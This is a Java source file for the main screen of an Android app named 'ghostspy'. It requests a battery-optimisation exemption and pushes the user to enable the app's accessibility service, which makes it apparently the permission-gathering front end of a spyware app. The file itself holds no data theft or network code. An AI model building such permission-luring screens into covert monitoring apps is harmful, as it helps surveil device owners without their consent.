package com.spy.ghostspy;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.RelativeLayout;

import com.spy.ghostspy.server.Server;

public class MainActivity extends AppCompatActivity {
    private Button mBtnAllow;
    private Button mBtnEnable;
    private RelativeLayout mLayoutMajor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setReady();
    }

    @Override
    protected void onResume() {
        super.onResume();
        requestPowerManger();
//        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
            mLayoutMajor.setVisibility(View.VISIBLE);
//        } else {
//            mLayoutMajor.setVisibility(View.GONE);
//        }
    }

    @SuppressLint("BatteryLife")
    private void requestPowerManger() {
        Intent intent = new Intent();
        String packageName = getPackageName();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("test", "batter enable");
            intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
        } else {
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent);
        }
    }

    private void setReady() {
        mBtnAllow = (Button) findViewById(R.id.btn_allow);
        mBtnEnable = (Button) findViewById(R.id.btn_enable);
        mLayoutMajor = (RelativeLayout) findViewById(R.id.layout_major);
        mBtnAllow.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
        mBtnEnable.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(!isAccessibilityPermissionGranted(getApplicationContext())) {
                    requestAccessibilitySettingManager();
                }
            }
        });
    }

    public static boolean isAccessibilityPermissionGranted(Context context) {
        int accessibilityEnabled = 0;

        final String service = context.getPackageName() + "/" + context.getPackageName()+ ".services.MainAccessibilityService";
        Log.d("pacakgename::", context.getPackageName() + ":::" + service);
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    context.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    Log.d("accessibilityService::", accessibilityService);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d("permission11::", "Accessibility is enabled");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void requestAccessibilitySettingManager() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
    }
}